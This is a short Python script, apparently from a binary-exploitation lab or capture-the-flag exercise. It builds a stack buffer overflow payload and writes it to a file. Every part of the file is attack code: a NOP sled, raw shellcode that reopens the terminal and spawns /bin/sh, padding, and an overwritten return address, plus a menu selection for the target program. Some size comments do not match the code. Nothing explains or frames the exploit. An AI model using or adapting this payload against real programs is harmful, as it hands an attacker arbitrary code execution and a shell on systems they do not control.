#!/usr/bin/python

# BUFER = 72
# SHELLCODE = 55
# NOP = 72 - 55 = 17 bytes
# Return address = 6 bytes
# RIP 0x7ffff7e200f5
# NOP = 0x90

#print (b"A" * 70 + b"B" * 8) # TOTAL 78


menuoption = "1"
nopsled = b"\x90" * 10 

shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
# 55 len

padding = b"A"*(78 - len(nopsled) - len(shellcode))

# 0x7fffffffe5a0
eip = b"\xa0\xe5\xff\xff\xff\x7f"

print (menuoption)
exploit = nopsled + shellcode + padding + eip
#print (nopsled + shellcode + padding + eip) 
print (exploit)
#print (len (exploit))


f = open("exploit.bin", "wb")
f.write(nopsled + shellcode + padding + eip)
f.close()
